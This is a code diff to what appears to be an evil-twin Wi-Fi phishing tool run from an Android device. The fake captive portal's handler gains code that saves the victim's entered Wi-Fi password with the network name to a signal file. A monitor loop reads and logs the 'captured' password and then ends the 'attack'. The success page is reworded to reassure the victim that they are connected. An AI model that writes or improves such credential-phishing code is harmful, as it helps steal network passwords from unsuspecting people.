@@ -442,14 +442,22 @@ class PortalHandler(http.server.BaseHTTPRequestHandler):
                 logger.info(f"[SUCCESS] Correct password entered for {{SAFE_SSID}}!")
                 correct_password_entered = True
                 
+                # Write stop signal file - main script will stop attack
+                try:
+                    with open("/sdcard/MT2/.attack_stop", "w") as f:
+                        f.write(f"{ts} {{SAFE_SSID}}:{{password}}")
+                except:
+                    pass
+                
                 # Send success response
                 self.send_response(200)
                 self.send_header("Content-Type", "text/html")
                 self.end_headers()
-                success_html = b"<html><body style='font-family:Arial;text-align:center;padding:40px'>"
-                success_html += b"<h2 style='color:green'>Connected!</h2>"
+                success_html = b"<html><body style='font-family:Arial;text-align:center;padding:40px;background:#0D1117;color:#E6EDF3'>"
+                success_html += b"<h2 style='color:#3FB950'>✓ Connected Successfully!</h2>"
                 success_html += b"<p>You are now connected to the internet.</p>"
-                success_html += b"<p>Please close this window and use the internet.</p>"
+                success_html += b"<p>Please close this window.</p>"
+                success_html += b"<p style='color:#8B949E;font-size:12px'>Password saved.</p>"
                 success_html += b"</body></html>"
                 self.wfile.write(success_html)
                 return
@@ -564,10 +572,23 @@ with socketserver.TCPServer(("", PORT), PortalHandler) as s:
         seen = set()
         max_iterations = 300  # 10 minutes max (sleep 2s * 300)
         iteration = 0
+        stop_file = Path("/sdcard/MT2/.attack_stop")
         
         while self.running and iteration < max_iterations:
             iteration += 1
             time.sleep(2)
+            
+            # Check for stop signal (correct password entered)
+            if stop_file.exists():
+                try:
+                    content = stop_file.read_text().strip()
+                    logger.info(f"[SUCCESS] Correct password captured: {content}")
+                    # Delete stop file
+                    stop_file.unlink()
+                    logger.info("Attack stopped - correct password obtained!")
+                    break
+                except Exception as e:
+                    logger.warning(f"Error reading stop file: {e}")
             
             if self.credentials_file.exists():
                 try:
@@ -584,7 +605,7 @@ with socketserver.TCPServer(("", PORT), PortalHandler) as s:
         if iteration >= max_iterations:
             logger.info("Monitor timeout - stopping capture watch")
         else:
-            logger.info("Monitor stopped normally")
+            logger.info("Monitor stopped - attack complete")
     
     # =========================================================================
     # SAFE CLEANUP - CRITICAL FOR GRACEFUL SHUTDOWN
